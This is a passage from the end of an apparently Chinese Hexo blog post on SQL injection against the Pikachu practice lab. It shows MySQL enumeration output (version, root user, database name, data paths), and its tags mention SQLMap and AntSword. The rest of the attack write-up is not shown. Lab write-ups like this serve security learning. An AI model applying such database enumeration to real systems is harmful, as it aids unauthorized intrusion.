+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">version():			5.7.26</span><br><span class="line">user():				root@localhost</span><br><span class="line">database():			pikachu</span><br><span class="line">system_user():		root@localhost</span><br><span class="line">session_user():		root@localhost</span><br><span class="line">current_user:		root@localhost</span><br><span class="line">load_file():</span><br><span class="line">@@datadir:			C:\z2\phpstudy_pro\Extensions\MySQL5.7.26\data\</span><br><span class="line">@@basedir:			C:\z2\phpstudy_pro\Extensions\MySQL5.7.26\</span><br><span class="line">@@version_complie_os:</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag"># SQL注入</a>
+              <a href="/tags/SQLMap/" rel="tag"># SQLMap</a>
+              <a href="/tags/AntSword/" rel="tag"># AntSword</a>
+              <a href="/tags/BurSpuite/" rel="tag"># BurSpuite</a>
+              <a href="/tags/Yakit/" rel="tag"># Yakit</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2023/11/20/LAMP%E6%90%AD%E5%BB%BA%E7%BD%91%E7%AB%99/" rel="prev" title="LAMP搭建搭建网站">
+                  <i class="fa fa-angle-left"></i> LAMP搭建搭建网站
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2023/11/25/Linux/" rel="next" title="Linux">
+                  Linux <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2023</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">John Doe</span>
+  </div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
